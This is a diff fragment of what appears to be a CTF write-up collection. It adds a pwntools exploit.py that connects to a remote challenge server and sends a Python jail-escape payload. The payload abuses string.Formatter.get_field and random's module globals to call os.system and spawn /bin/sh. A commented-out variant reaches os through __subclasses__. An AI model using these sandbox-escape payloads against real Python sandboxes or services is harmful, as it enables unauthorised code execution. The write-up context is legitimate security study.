@@ -32,4 +32,21 @@ https://github.com/nikosChalk/ctf-writeups/blob/master/uiuctf23/pyjail/rattler-r
 ### exploit.py
 
 ```python
+from pwn import *
+
+p = remote('3.35.196.167', 42424)
+#p = process(['python3', 'prob.py'])
+
+#dt = '''string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], {"a": ""})[0]()[84].load_module("os").system("sh")'''
+dt = '''
+class Baz(string.Formatter): pass; get_field = lambda self, field_name, args, kwargs: (string.Formatter.get_field(self, field_name, args, kwargs)[0]("/bin/sh"), ""); 
+Baz().format("{0.Random.__init__.__globals__[_os].system}", random)
+'''.replace('\n', '\r')
+p.sendlineafter(b': ', dt)
+p.send(b'\n')
+p.interactive()
 ```
+
+---
+## pwn/What's Happening?
+
